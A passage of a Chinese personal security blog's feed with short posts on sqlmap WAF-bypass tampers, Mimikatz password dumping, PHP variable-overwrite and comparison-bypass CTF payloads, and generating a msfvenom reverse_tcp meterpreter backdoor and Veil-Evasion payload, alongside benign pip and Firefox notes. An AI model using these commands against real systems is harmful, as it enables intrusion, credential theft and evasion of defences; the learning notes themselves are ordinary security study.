      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Socks5_proxy</title>
    <link href="http://yoursite.com/2018/05/21/Socks5_proxy/"/>
    <id>http://yoursite.com/2018/05/21/Socks5_proxy/</id>
    <published>2018-05-21T03:35:39.121Z</published>
    <updated>2018-05-21T03:51:47.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Info："><a href="#Info：" class="headerlink" title="Info："></a>Info：</h1><p>毕业设计做出这么个东西，也是蛮水的。。。    </p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage:"></a>Usage:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python Socks5_proxy.py       -- run on 1080</div><div class="line">python Socks5_proxy.py 2333  -- run on 2333</div></pre></td></tr></table></figure><h1 id="Test"><a href="#Test" class="headerlink" title="Test:"></a>Test:</h1><p><img src="/images/test1.PNG" alt=""></p><p><img src="/images/test2.PNG" alt=""></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ul><li><a href="https://github.com/felix021/ssocks5/blob/master/ssocks5.py" target="_blank" rel="external">ssocks5</a></li><li><a href="https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py" target="_blank" rel="external">repocks</a></li><li><a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="external">rfc1928</a><h1 id="Download"><a href="#Download" class="headerlink" title="Download:"></a>Download:</h1></li></ul><p><a href="https://github.com/sun1024/Socks5_proxy" target="_blank" rel="external">Socks5_proxy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Info：&quot;&gt;&lt;a href=&quot;#Info：&quot; class=&quot;headerlink&quot; title=&quot;Info：&quot;&gt;&lt;/a&gt;Info：&lt;/h1&gt;&lt;p&gt;毕业设计做出这么个东西，也是蛮水的。。。    &lt;/p&gt;
&lt;h1 id=&quot;Usage&quot;&gt;&lt;a href=&quot;#Usag
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Some Sqlmap Tricks</title>
    <link href="http://yoursite.com/2017/08/19/Some%20Sqlmap%20Tricks/"/>
    <id>http://yoursite.com/2017/08/19/Some Sqlmap Tricks/</id>
    <published>2017-08-19T08:14:20.320Z</published>
    <updated>2017-09-15T06:44:20.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-–prefix-–suffix"><a href="#0x01-–prefix-–suffix" class="headerlink" title="0x01 –prefix,–suffix"></a>0x01 –prefix,–suffix</h2><p>在注入的payload的前面或者后面加一些字符, 使sql语句能正常拼接:</p><p><code>--prefix &quot;xxx&quot; --suffix &quot;xxx&quot;</code></p><h2 id="0x02-–start-–stop"><a href="#0x02-–start-–stop" class="headerlink" title="0x02 –start –stop"></a>0x02 –start –stop</h2><p>表中的数据量过多, 或者盲注太费时间, 使用–start,–stop指定几行数据:</p><p><code>--start num1 --stop num2</code></p><h2 id="0x03-–search"><a href="#0x03-–search" class="headerlink" title="0x03 –search"></a>0x03 –search</h2><p>寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段:</p><p><code>--search -C sfzh</code></p><h2 id="0x04-–count"><a href="#0x04-–count" class="headerlink" title="0x04 –count"></a>0x04 –count</h2><p>只获取表中的数据个数:</p><p><code>--count -D testDB</code></p><h2 id="0x05-一些tamper"><a href="#0x05-一些tamper" class="headerlink" title="0x05 一些tamper"></a>0x05 一些tamper</h2><p>如果web应用使用asp/asp.net开发，charunicodeencode.py和percentage.py可以绕过Waf。</p><p><code>--tamepr=charunicodeencode</code><br><code>--tamepr=percentage</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://119.29.64.123:8080/WooyunDrops/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C" target="_blank" rel="external">sqlmap用户手册</a><br><a href="http://www.freebuf.com/articles/1000.html" target="_blank" rel="external">如何使用SQLMap绕过WAF</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-–prefix-–suffix&quot;&gt;&lt;a href=&quot;#0x01-–prefix-–suffix&quot; class=&quot;headerlink&quot; title=&quot;0x01 –prefix,–suffix&quot;&gt;&lt;/a&gt;0x01 –prefix,–suffix&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="Sqlmap" scheme="http://yoursite.com/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>Mimikatz简单使用（备忘）</title>
    <link href="http://yoursite.com/2017/04/28/Mimikatz%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/"/>
    <id>http://yoursite.com/2017/04/28/Mimikatz简单使用（备忘）/</id>
    <published>2017-04-28T09:45:23.228Z</published>
    <updated>2017-04-28T10:07:42.948Z</updated>
    
    <content type="html"><![CDATA[<ul><li>下载地址：<br><a href="https://github.com/gentilkiwi/mimikatz/releases/latest" target="_blank" rel="external">Mimikatz</a></li><li><p>简单使用：</p><ul><li>step1:<br>以管理员身份运行mimikatz.exe<br>(根据计算机系统选择相应版本)</li><li><p>step2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line"></div><div class="line">#提升权限</div></pre></td></tr></table></figure></li><li><p>step3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sekurlsa::logonpasswords</div><div class="line"></div><div class="line">#获取密码</div></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;下载地址：&lt;br&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/releases/latest&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Mimikatz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;简
      
    
    </summary>
    
    
      <category term="Mimikatz" scheme="http://yoursite.com/tags/Mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>firefox更换中文语言包</title>
    <link href="http://yoursite.com/2017/04/07/firefox%E6%9B%B4%E6%8D%A2%E4%B8%AD%E6%96%87%E8%AF%AD%E8%A8%80%E5%8C%85/"/>
    <id>http://yoursite.com/2017/04/07/firefox更换中文语言包/</id>
    <published>2017-04-07T10:38:10.012Z</published>
    <updated>2017-04-07T10:50:04.605Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下，免得下次再去网上搜</p><ul><li>中文语言包下载地址：<br><code>http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi</code><br>(版本号:27.0.1/操作系统：win32)</li><li><p>在FireFox地址栏里输入”about:config”。</p></li><li><p>然后在过滤器里输入general.useragent.locale，双击然后在弹出的对话框里输入”zh-CN”。</p></li><li><p>重启，更换成功。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下，免得下次再去网上搜&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中文语言包下载地址：&lt;br&gt;&lt;code&gt;http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi&lt;/code&gt;
      
    
    </summary>
    
    
      <category term="firefox" scheme="http://yoursite.com/tags/firefox/"/>
    
  </entry>
  
  <entry>
    <title>pip修改官方源踩的坑</title>
    <link href="http://yoursite.com/2017/03/29/pip%E4%BF%AE%E6%94%B9%E5%AE%98%E6%96%B9%E6%BA%90%E8%B8%A9%E7%9A%84%E5%9D%91/"/>
    <id>http://yoursite.com/2017/03/29/pip修改官方源踩的坑/</id>
    <published>2017-03-29T03:07:04.213Z</published>
    <updated>2017-03-29T04:00:46.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux篇："><a href="#linux篇：" class="headerlink" title="linux篇："></a>linux篇：</h2><ul><li>编辑配置文件（如果没有, 新建一份）：<br><code>vi ~/.pip/pip.conf</code></li><li><p>在配置文件内加上（这里使用豆瓣源）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure></li><li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p></li></ul><h2 id="windows篇（比较奇葩）："><a href="#windows篇（比较奇葩）：" class="headerlink" title="windows篇（比较奇葩）："></a>windows篇（比较奇葩）：</h2><ul><li>新建文件（pip文件夹与pip.ini都要自己新建）：<br><code>C:\Users\用户名\pip\pip.ini</code><br>注意：不是C:\Users\用户名\AppData\Local\pip下的 pip.ini</li><li><p>在配置文件内加上（这里使用豆瓣源）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure></li><li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p></li></ul><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.v2ex.com/t/291817" target="_blank" rel="external">https://www.v2ex.com/t/291817</a><br><a href="https://ficapy.github.io/2013/12/27/pip_use_china_mirror/" target="_blank" rel="external">https://ficapy.github.io/2013/12/27/pip_use_china_mirror/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux篇：&quot;&gt;&lt;a href=&quot;#linux篇：&quot; class=&quot;headerlink&quot; title=&quot;linux篇：&quot;&gt;&lt;/a&gt;linux篇：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;编辑配置文件（如果没有, 新建一份）：&lt;br&gt;&lt;code&gt;vi ~/.pip/pip.c
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap扩展tamper及其简单编写</title>
    <link href="http://yoursite.com/2017/03/22/sqlmap%E6%89%A9%E5%B1%95tamper%E5%8F%8A%E5%85%B6%E7%AE%80%E5%8D%95%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2017/03/22/sqlmap扩展tamper及其简单编写/</id>
    <published>2017-03-22T04:54:48.702Z</published>
    <updated>2018-05-24T04:38:47.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见tamper-搜集自网络-："><a href="#常见tamper-搜集自网络-：" class="headerlink" title="常见tamper(搜集自网络)："></a>常见tamper(搜集自网络)：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</div><div class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</div><div class="line">appendnullbyte.py 在payload末尾添加空字符编码</div><div class="line">base64encode.py 对给定的payload全部字符使用Base64编码</div><div class="line">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</div><div class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</div><div class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</div><div class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</div><div class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</div><div class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</div><div class="line">equaltolike.py  用“LIKE”运算符替换全部等于号“=”</div><div class="line">greatest.py  用“GREATEST”函数替换大于号“&gt;”</div><div class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</div><div class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</div><div class="line">lowercase.py 用小写值替换每个关键字字符</div><div class="line">modsecurityversioned.py 用注释包围完整的查询</div><div class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</div><div class="line">multiplespaces.py 在SQL关键字周围添加多个空格</div><div class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</div><div class="line">overlongutf8.py 转换给定的payload当中的所有字符</div><div class="line">percentage.py 在每个字符之前添加一个百分号</div><div class="line">randomcase.py 随机转换每个关键字字符的大小写</div><div class="line">randomcomments.py 向SQL关键字中插入随机注释</div><div class="line">securesphere.py 添加经过特殊构造的字符串</div><div class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</div><div class="line">space2comment.py 用“/**/”替换空格符</div><div class="line">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</div><div class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</div><div class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class="line">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</div><div class="line">space2plus.py 用加号“+”替换空格符</div><div class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</div><div class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</div><div class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</div><div class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</div><div class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</div><div class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</div></pre></td></tr></table></figure><h2 id="tamper的简单编写："><a href="#tamper的简单编写：" class="headerlink" title="tamper的简单编写："></a>tamper的简单编写：</h2><p>栗子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sqlmap/tamper/yourtamper.py</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"></div><div class="line"><span class="comment">#定义脚本的优先级，用于有多个tamper脚本的情况</span></div><div class="line">__priority__ = PRIORITY.LOWEST </div><div class="line"></div><div class="line"><span class="comment">#声明该脚本适用/不适用的范围，可以为空</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line"><span class="keyword">pass</span> </div><div class="line"></div><div class="line"><span class="comment">#主要函数，接受的参数为payload和**kwargs返回值为替换后的payload</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line">    <span class="keyword">return</span> payload.replace(<span class="string">"."</span>, <span class="string">"\\."</span>)</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常见tamper-搜集自网络-：&quot;&gt;&lt;a href=&quot;#常见tamper-搜集自网络-：&quot; class=&quot;headerlink&quot; title=&quot;常见tamper(搜集自网络)：&quot;&gt;&lt;/a&gt;常见tamper(搜集自网络)：&lt;/h2&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>php变量覆盖的学习</title>
    <link href="http://yoursite.com/2017/03/14/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2017/03/14/php变量覆盖的学习/</id>
    <published>2017-03-14T11:01:47.927Z</published>
    <updated>2017-03-22T05:17:56.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于php变量覆盖漏洞："><a href="#关于php变量覆盖漏洞：" class="headerlink" title="关于php变量覆盖漏洞："></a>关于php变量覆盖漏洞：</h1><p>关注函数：extract(),parse_str(),$$,import_request_varables(),etc.</p><h2 id="extract"><a href="#extract" class="headerlink" title="extract():"></a>extract():</h2><p>栗子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a = <span class="number">2333</span>;</div><div class="line">@extract($_GET);</div><div class="line">print_r($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?a=1//即可覆盖$a</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str():"></a>parse_str():</h2><p>栗子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">2333</span>;</div><div class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?a=1//即可覆盖$a</code></p><h2 id=""><a href="#" class="headerlink" title="$$:"></a>$$:</h2><p>栗子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a = <span class="number">2333</span>;</div><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</div><div class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value)&#123;</div><div class="line">$$_key = addslashes($_value);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">print_r($a)</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?a=1//即可覆盖$a</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关于php变量覆盖漏洞：&quot;&gt;&lt;a href=&quot;#关于php变量覆盖漏洞：&quot; class=&quot;headerlink&quot; title=&quot;关于php变量覆盖漏洞：&quot;&gt;&lt;/a&gt;关于php变量覆盖漏洞：&lt;/h1&gt;&lt;p&gt;关注函数：extract(),parse_str(),$$,
      
    
    </summary>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>关于php比较运算符</title>
    <link href="http://yoursite.com/2017/02/28/%E5%85%B3%E4%BA%8Ephp%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <id>http://yoursite.com/2017/02/28/关于php比较运算符/</id>
    <published>2017-02-28T10:10:50.804Z</published>
    <updated>2017-04-02T02:07:15.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="比较运算符”-”与”-”的学习："><a href="#比较运算符”-”与”-”的学习：" class="headerlink" title="比较运算符”==”与”===”的学习："></a>比较运算符”==”与”===”的学习：</h1><h2 id="关于”-”的绕过："><a href="#关于”-”的绕过：" class="headerlink" title="关于”==”的绕过："></a>关于”==”的绕过：</h2><p>0e开头的全部相等<br>栗子:<br><code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code><br><code>md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;)</code><br><code>sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;)</code><br><code>&#39;0010e2&#39; == &#39;1e3&#39;</code><br><code>&#39;0x1234Ab&#39; == &#39;1193131&#39;</code><br><code>&#39;0xABCdef&#39; == &#39;     0xABCdef&#39;</code><br>一道简单的CTF题目：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$key = <span class="string">"llocdpocuzion5dcp2bindhspiccy"</span>;</div><div class="line">$flag = strcmp($key, $_GET[<span class="string">'key'</span>]);</div><div class="line"><span class="keyword">if</span> ($flag == <span class="number">0</span>) &#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"Welcome!"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"Bad key!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?key[]=1</code></p><p>var_dump(strcmp( ‘’, array())) =&gt; NULL ⇒ NULL == 0 ⇒ Get Flag！</p><h2 id="关于“-”的绕过："><a href="#关于“-”的绕过：" class="headerlink" title="关于“===”的绕过："></a>关于“===”的绕过：</h2><p>利用数组绕过</p><p>一道简单的CTF题目：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div></pre></td></tr></table></figure></p><p>payload:<br><code>?name[]=1&amp;password[]=2</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;比较运算符”-”与”-”的学习：&quot;&gt;&lt;a href=&quot;#比较运算符”-”与”-”的学习：&quot; class=&quot;headerlink&quot; title=&quot;比较运算符”==”与”===”的学习：&quot;&gt;&lt;/a&gt;比较运算符”==”与”===”的学习：&lt;/h1&gt;&lt;h2 id=&quot;关于”
      
    
    </summary>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>msf 初体验</title>
    <link href="http://yoursite.com/2017/02/06/msf%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2017/02/06/msf初体验/</id>
    <published>2017-02-06T13:27:46.603Z</published>
    <updated>2017-02-06T14:06:16.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="msf简单使用：-以windows-meterpreter-reverse-tcp为例"><a href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例" class="headerlink" title="msf简单使用：(以windows/meterpreter/reverse_tcp为例)"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id="1-payload设置："><a href="#1-payload设置：" class="headerlink" title="1.payload设置："></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p><h2 id="2-监听："><a href="#2-监听：" class="headerlink" title="2.监听："></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p><h2 id="3-插入攻击荷载"><a href="#3-插入攻击荷载" class="headerlink" title="3.插入攻击荷载"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p><h2 id="4-使用run-或者-exploit-启动攻击"><a href="#4-使用run-或者-exploit-启动攻击" class="headerlink" title="4.使用run 或者 exploit 启动攻击"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p><p>==============================</p><h1 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h1><h2 id="使用veil-veasion生成后门："><a href="#使用veil-veasion生成后门：" class="headerlink" title="使用veil-veasion生成后门："></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p><p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p><p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;msf简单使用：-以windows-meterpreter-reverse-tcp为例&quot;&gt;&lt;a href=&quot;#msf简单使用：-以windows-meterpreter-reverse-tcp为例&quot; class=&quot;headerlink&quot; title=&quot;msf简单使
      
    
    </summary>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/01/14/hello%20world/"/>
    <id>http://yoursite.com/2017/01/14/hello world/</id>
    <published>2017-01-14T08:17:05.298Z</published>
    <updated>2017-01-17T12:28:13.070Z</updated>
    
    <content type="html"><![CDATA[<p>寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。</p><p>随便写写说的好像有人会来看的样子。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。&lt;/p&gt;
&lt;p&gt;随便写写说的好像有人会来看的样子。。。&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
